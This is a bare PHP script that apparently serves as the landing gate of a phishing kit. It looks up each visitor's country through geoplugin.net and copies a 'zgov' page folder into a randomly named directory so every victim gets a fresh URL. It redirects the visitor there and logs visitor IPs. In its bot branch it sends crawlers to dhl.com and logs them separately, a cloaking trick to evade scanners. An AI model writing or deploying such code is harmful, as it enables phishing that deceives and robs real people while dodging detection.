<?php

$ip = getenv("REMOTE_ADDR");
$details = json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip . ""));
$Country = $details->geoplugin_countryName;
$hostname = gethostbyaddr($ip);
$TIME = date("d F Y H:i:s");


    if ( $COUNTRY == "Switzerland" or true) { 
    
    $random = rand(0,100000000000);
$DIR    = substr(md5($random), 15);
function recurse_copy($home,$DIR) {
$dir = opendir($home);
@mkdir($DIR);
while(false !== ( $file = readdir($dir)) ) {
if (( $file != '.' ) && ( $file != '..' )) {
if ( is_dir($home . '/' . $file) ) {
recurse_copy($home . '/' . $file,$DIR . '/' . $file);
}
else {
copy($home . '/' . $file,$DIR . '/' . $file);
}
}
}
closedir($dir);
}
$home="zgov";
recurse_copy( $home, $DIR );
header("location:$DIR");

            $ip = getenv("REMOTE_ADDR");
            $file = fopen("VUsr.txt","a");
            fwrite($file,$ip."  -   ".$TIME." -  " . $COUNTRY ."\n")  ;
            
      }else {
           @header("Location: https://dhl.com");
           
            $ip = getenv("REMOTE_ADDR");
            $file = fopen("boOTS.txt","a");
            fwrite($file,$ip."  -   ".$TIME." -  " . $COUNTRY ."\n")  ;
      }
      


?>
